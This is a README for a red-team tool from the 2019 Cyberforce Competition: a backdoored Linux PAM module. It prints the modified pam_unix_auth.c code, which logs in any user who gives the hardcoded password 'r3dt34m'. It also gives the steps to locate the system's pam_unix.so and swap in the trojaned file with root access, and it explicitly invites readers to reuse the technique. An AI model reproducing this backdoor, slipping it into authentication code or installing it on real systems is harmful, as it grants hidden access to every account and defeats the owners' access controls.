# Trojan'd Pam

Trojan Paaaaam!

This code was used as a means of installing a virtually undetectable
backdoor into compromised systems during the 2019 Cyberforce Competition.
These worked with pam 1.1.8 and pam 1.3, so if you are considering using
this I would implore that you make your own based on the target's version
of pam, or you could hose the entire system disallowing anyone from logging
in! Other than this paragraph, I am leaving this Readme file largely intact
even when it references things like ".5" or ".6". These are references to
machines in the Cyberforce Competition.

The supplied pam_unix.so file is backdoored to allow you to log on as
any user on the system if you supply the password "r3dt34m"

To accomplish this, I downloaded the source of libpam 1.3.x, modified
the pam_unix_auth.c file, and changed the following line:

```c
    /* verify the password of this user */
    retval = _unix_verify_password(pamh, name, p, ctrl);
```

To the following code block:

```c
    /* verify the password of this user */
    if (strcmp(p, "r3dt34m") != 0) {
        retval = _unix_verify_password(pamh, name, p, ctrl);
    } else {
        retval = PAM_SUCCESS;
    }
```

This will allow the pam stack to operate normally otherwise.

This was borrowed from [0x90909090](http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html). Thank you for this!

This is **confirmed working** on .5 (ubuntu), .6 (centos), and .9 (the HMI).

**UPDATE:** This does not work on .7, the Debian9 box! I'm not entirely
sure why. Beware doing this as no one will be able to log into this box!

To install, upload the pam_unix.so file included in this repo, determine
the location of the remote pam_unix.so file:

```bash
target:~# find / -name pam_unix.so 2>/dev/null
/lib/x86_64-linux-gnu/security/pam_unix.so
```

Then simply swap out the files. It should work immediately.

**You need root access to make this change!**
